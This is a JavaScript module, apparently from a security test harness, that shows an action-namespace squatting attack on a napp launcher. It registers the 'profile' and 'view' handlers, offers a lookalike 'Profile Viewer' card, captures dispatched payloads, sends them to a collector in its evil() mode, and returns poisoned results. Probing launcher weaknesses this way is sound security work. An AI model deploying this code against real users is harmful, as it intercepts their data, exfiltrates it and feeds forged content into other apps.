// evil-04 — action namespace squatting (tier 1). NAPP.md: "There is no
// restriction on what actions are allowed" — the action namespace is a
// global registry any installed app can claim any name in. The reference
// launcher auto-picks the SOLE handler with no prompt (validated from
// source: runNappAction picks `candidates[0]` when exactly one exists) and
// asks only when the list is ambiguous — and an ambiguous list is a social
// attack, not a security boundary: two cards titled "Relays" differ by
// nothing the protocol can check. Squatting `profile` and `view` puts this
// napp between every profile click and every note view in the launcher.
//
// This napp registers the victim's patterns at load. The demo passively
// records what arrives; the launcher's own dispatch buttons and the victim's
// periodic delegations feed the probes.
window.__EVIL_KIT__ = [
  {
    label: 'squat registrations',
    note: 'NAPP.md names the common actions: profile, view, view:<kind>, feed… Nothing binds a name to an app. Registered here at load:',
    data: { registerAction: ['profile', 'view'], wildcard: '"view" matches every view:<kind-number> dispatch' },
  },
  {
    label: 'lookalike metadata card',
    note: 'The ambiguous-handler picker shows two cards. Nothing in the protocol binds a title to an author or a name to a key — the user picks blind.',
    data: { id: 'evil-04-action-squat', title: 'Profile Viewer', description: 'Open profiles and notes.' },
  },
];

// ── the squat: register the victim's names, record what arrives ─────────────
const feed = { received: [], echoes: [] };
function recordReceived(name, payload) {
  feed.received.push({ name, payload, at: Date.now() });
}
function reg(pattern) {
  if (window.napp && typeof window.napp.registerAction === 'function') {
    window.napp.registerAction(pattern, (name, payload) => {
      recordReceived(name, payload);
      return { handledBy: 'evil-04', poisoned: true, note: 'you asked another app; you got me' };
    });
  }
}
reg('profile');
reg('view');
// the victim's result echoes (harness instrumentation) are the round-trip proof
window.addEventListener('message', (e) => {
  const d = e.data && e.data.__victimEcho;
  if (d) feed.echoes.push(d);
});
function waitFor(pred, ms) {
  return new Promise((resolve) => {
    const t0 = Date.now();
    const iv = setInterval(() => {
      if (pred()) { clearInterval(iv); resolve(true); }
      else if (Date.now() - t0 > ms) { clearInterval(iv); resolve(false); }
    }, 150);
  });
}
function feedSummary() {
  const names = feed.received.map(r => r.name);
  return names.length + ' dispatch(es) received (' + names.slice(0, 3).join(', ') + ')';
}

const ATTACKS = [
  {
    id: 'name-squat',
    name: 'profile name squat',
    target: 'NAPP.md: "There is no restriction on what actions are allowed" — profile is a global name',
    severity: 'critical',
    harm: 'Squatting the action names a victim app dispatches to puts this napp between the caller and its data: profile payloads (pubkeys the user clicked), view payloads (notes), feed payloads (follow lists) all arrive at the squatter, and the caller accepts whatever answer it gets back.',
    evilBrief: 'Waits for the next profile dispatch to arrive at the squatted handler and POSTs the received PAYLOAD (the caller\'s data) to the collector.',
    async demo() {
      const got = await waitFor(() => feed.received.some(r => r.name === 'profile'), 6000);
      if (got) {
        const hit = feed.received.find(r => r.name === 'profile');
        return armed('a profile dispatch ARRIVED AT ME — caller payload: ' + mask(JSON.stringify(hit.payload), 42) + ' — I squat the name another app registered; the launcher routed its user to me');
      }
      if (feed.echoes.some(e2 => e2.what === 'action-dispatch-result' || e2.what === 'action-handled')) {
        return blocked('dispatches are flowing to the VICTIM (sole-handler auto-pick or your picker choice) — the namespace held this time');
      }
      return na('no dispatch traffic observed — open the victim napp or drive the launcher input during the probe');
    },
    async evil() {
      const got = await waitFor(() => feed.received.some(r => r.name === 'profile'), 12000);
      const hit = feed.received.find(r => r.name === 'profile');
      const out = { received: got, payload: hit ? hit.payload : null };
      if (hit) out.exfil = await sendToCollector('squat-profile-payload', { name: hit.name, payload: hit.payload });
      return out;
    },
  },
  {
    id: 'view-wildcard',
    name: 'view pattern wildcard',
    target: 'NAPP.md: `"view"` matches all `"view:<any-number>"` actions',
    severity: 'high',
    harm: 'One registered string — "view" — matches every view:<kind> dispatch in the launcher. The squatter does not even need to enumerate the kinds; note views, long-form views, DM views all arrive.',
    evilBrief: 'Waits for the next view dispatch (any view:<kind>) and POSTs its payload to the collector.',
    async demo() {
      const got = await waitFor(() => feed.received.some(r => /^view(:\d+)?$/.test(r.name)), 6000);
      if (got) {
        const hit = feed.received.find(r => /^view(:\d+)?$/.test(r.name));
        return armed('a ' + hit.name + ' dispatch ARRIVED AT ME through my bare "view" pattern — the wildcard hands me every view:<kind> in the launcher');
      }
      if (feed.received.length || feed.echoes.length) {
        return blocked('dispatch traffic exists but no view dispatch was routed to my wildcard — held (pick policy or a specific-kind handler took it)');
      }
      return na('no dispatch traffic observed during the probe');
    },
    async evil() {
      const got = await waitFor(() => feed.received.some(r => /^view(:\d+)?$/.test(r.name)), 12000);
      const hit = feed.received.find(r => /^view(:\d+)?$/.test(r.name));
      const out = { received: got, payload: hit ? hit.payload : null };
      if (hit) out.exfil = await sendToCollector('squat-view-payload', { name: hit.name, payload: hit.payload });
      return out;
    },
  },
  {
    id: 'result-poison',
    name: 'poisoned action results',
    target: 'the caller accepts whatever the handler returns — napp.action is caller-trusted',
    severity: 'high',
    harm: 'When a squatted dispatch lands on this napp, the CALLER receives my answer as the action result: fake profiles, fake note bodies, fake relay lists — attacker data flowing into other apps\' rendering, indistinguishable from a real handler\'s answer.',
    evilBrief: 'Returns a poisoned result to the next dispatch and watches the caller\'s own echo confirm my answer reached the victim app\'s code.',
    async demo() {
      const roundTrip = await waitFor(
        () => feed.echoes.some(e2 =>
          e2.what === 'action-dispatch-result' &&
          JSON.stringify(e2.result || {}).indexOf('evil-04') !== -1),
        6000);
      if (roundTrip) {
        return armed('round trip proven: the victim dispatched profile, MY handler answered, and its code received my poisoned result — attacker data flows into other apps\' action results');
      }
      if (feed.received.length) {
        return na('dispatches reached me (launcher-initiated ones echo nowhere) but no caller round-trip was observed — victim-initiated dispatches prove the poison');
      }
      return blocked('no dispatch landed on me — nothing to poison');
    },
    async evil() {
      const roundTrip = await waitFor(
        () => feed.echoes.some(e2 =>
          e2.what === 'action-dispatch-result' &&
          JSON.stringify(e2.result || {}).indexOf('evil-04') !== -1),
        14000);
      return { roundTrip, poisonedResult: { handledBy: 'evil-04', poisoned: true } };
    },
  },
];
